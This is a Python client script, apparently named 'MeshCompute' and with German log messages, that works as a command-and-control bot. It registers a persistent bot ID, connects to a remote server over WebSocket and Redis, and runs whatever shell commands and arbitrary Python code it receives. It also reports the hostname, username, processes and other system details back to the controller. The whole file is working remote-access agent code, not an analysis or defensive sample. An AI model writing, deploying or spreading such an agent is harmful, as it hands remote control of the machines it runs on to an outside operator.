import asyncio
import json
import uuid
import platform
import psutil
import logging
import shlex
import os
import socket
from dotenv import load_dotenv
import redis.asyncio as redis
import websockets
from common.config import REDIS_URL, MAX_COMMAND_TIMEOUT, SERVER_URL

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Persistente Bot-ID
BOT_ID_FILE = "client/bot_id.txt"
if os.path.exists(BOT_ID_FILE):
    with open(BOT_ID_FILE, "r") as f:
        BOT_ID = f.read().strip()
else:
    BOT_ID = f"{socket.gethostname()}-{str(uuid.uuid4())[:8]}"
    os.makedirs("client", exist_ok=True)
    with open(BOT_ID_FILE, "w") as f:
        f.write(BOT_ID)

async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "cpu": psutil.cpu_count(logical=False),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "username": os.getenv("USER") or os.getenv("USERNAME"),
        "cwd": os.getcwd(),
        "bot_id": BOT_ID,
        "pid": os.getpid()
    }

async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
    try:
        args = shlex.split(cmd)
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return {"success": False, "error": "Command timed out"}
        return {
            "success": proc.returncode == 0,
            "output": stdout.decode('utf-8', errors='replace'),
            "error": stderr.decode('utf-8', errors='replace'),
            "returncode": proc.returncode
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

async def process_task(task: dict, r: redis.Redis):
    task_id = task["task_id"]
    action = task["action"]
    payload = task.get("payload")
    result = {
        "type": "result",
        "task_id": task_id,
        "bot_id": BOT_ID
    }

    try:
        if action == "exec":
            res = await execute_command(payload)
            result.update(res)
            result["command"] = payload
        elif action == "sysinfo":
            result["success"] = True
            result["info"] = await get_system_info()
        elif action == "python":
            try:
                exec_globals = {}
                exec(payload, exec_globals)
                output = exec_globals.get("output", "Code executed (no output variable)")
                result.update({"success": True, "output": str(output)})
            except Exception as e:
                result.update({"success": False, "error": str(e)})
        elif action == "ps":
            processes = [{"pid": p.info['pid'], "name": p.info['name'], "cpu": p.info.get('cpu_percent', 0)}
                         for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
            result.update({"success": True, "processes": processes[:50]})
        elif action == "ping":
            result.update({"success": True, "message": "pong"})
        else:
            result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
    except Exception as e:
        result["success"] = False
        result["error"] = str(e)

    result_key = f"mesh:results:{task_id}"
    await r.rpush(result_key, json.dumps(result))
    await r.expire(result_key, 300)

async def main():
    r = None
    while True:
        try:
            if r is None:
                r = await redis.from_url(
                    REDIS_URL, decode_responses=True,
                    socket_connect_timeout=10, socket_timeout=60,
                    retry_on_timeout=True
                )
                await r.ping()

            async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40) as ws:
                await ws.send(json.dumps({"type": "client", "bot_id": BOT_ID}))
                logger.info(f"✅ Verbunden als {BOT_ID}")

                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        if "task_id" in msg and "action" in msg:
                            asyncio.create_task(process_task(msg, r))
                    except Exception as e:
                        logger.warning(f"Fehler beim Verarbeiten einer Nachricht: {e}")

        except websockets.exceptions.ConnectionClosed:
            logger.warning("WebSocket Verbindung verloren → Reconnect in 3s")
            await asyncio.sleep(3)
        except Exception as e:
            logger.error(f"Fehler im Client: {e}")
            await asyncio.sleep(3)

if __name__ == "__main__":
    print(f"MeshCompute Client gestartet → {BOT_ID}")
    asyncio.run(main())